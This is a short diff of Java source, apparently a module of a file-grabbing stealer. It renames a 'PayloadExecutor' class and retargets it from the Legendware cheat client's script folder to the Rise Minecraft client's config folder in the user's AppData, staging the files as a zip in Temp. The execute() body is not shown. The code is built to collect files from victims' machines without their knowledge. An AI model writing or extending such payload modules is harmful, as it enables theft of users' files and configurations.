@@ -10,15 +10,15 @@ import java.util.Optional;
 
 /**
  * @author Peter
- * @since 09/13/2022
- * Gets Legendware's script folder(since it uses configs from the cloud).
+ * @since 10/09/2022
+ * Back to the project and now into mc 1.8 cheating >:).
  */
 
-public class LegendwareScripts implements PayloadExecutor {
+public class RiseConfigs implements PayloadExecutor {
     Main main = new Main();
 
-    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Legendware\\Scripts";
-    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofLegend.zip";
+    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\Rise";
+    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofRise.zip";
 
     @Override
     public void execute() throws Exception {
